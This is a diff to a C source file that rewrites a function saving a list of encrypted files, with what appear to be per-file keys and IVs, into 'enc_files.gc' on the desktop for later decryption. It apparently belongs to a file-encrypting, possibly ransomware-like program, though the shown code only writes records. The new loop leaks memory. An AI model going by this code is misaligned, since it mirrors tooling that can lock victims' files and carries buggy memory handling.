@@ -72,35 +72,32 @@ void find_files(List **files, char* start_path){
  * This file will be used to decrypt.
  * @param l -> type = EncList
  */
-void save_into_file_encrypted_list(List *l, char * start_path){
+void save_into_file_encrypted_list(List *l, char * desktop){
     FILE *f;
     char * new_file;
-    int status;
-    int tam;
-    List aux;
-    aux.info[0] = (char *)malloc(33);
-    aux.info[1] = (char *)malloc(17);
-    //new_file = (char*)malloc(strlen(start_path) + "enc_files.gc" + 1);
-    new_file = "/home/tarcisio/Desktop/enc_files.gc";
-    //strcpy(new_file, start_path);
-    //strcat(new_file, "enc_files.gc");
-    //strcpy(new_file,"/home/tarcisio/Desktop/enc_files.gc");
-    f = fopen(new_file, "w");
+    char *line;
+    new_file = (char*)malloc((strlen(desktop) + 13));
+    strcpy(new_file, desktop);
+    strcat(new_file, "enc_files.gc");
 
+    f = fopen(new_file, "w");
+    
     while(l != NULL){
-        tam = strlen(l->info[2]);
-        aux.info[2] = (char *)malloc(tam+1);
-        strcpy(aux.info[0], l->info[0]);
-        strcpy(aux.info[1], l->info[1]);
-        strcpy(aux.info[2], l->info[2]);
-        status = fwrite(&aux, sizeof(List), 1, f);
-        memset(aux.info[0], 0, 33);
-        memset(aux.info[1], 0, 17);
-        memset(aux.info[2], 0, tam);
+        line = malloc(strlen(l->info[0]) + strlen(l->info[1]) + strlen(l->info[2]) + 11);
+        strcpy(line, l->info[0]);
+        strcat(line, "+/-");
+        strcat(line, l->info[1]);
+        strcat(line, "+/-");
+        strcat(line, l->info[2]);
+        strcat(line, "\n");
+        fwrite(line, strlen(line), 1, f);
+        memset(line, 0, strlen(line));
         l = l->prox;
     }
+    free(line);
     free(new_file);
     fclose(f);
+
 }
 
 /**
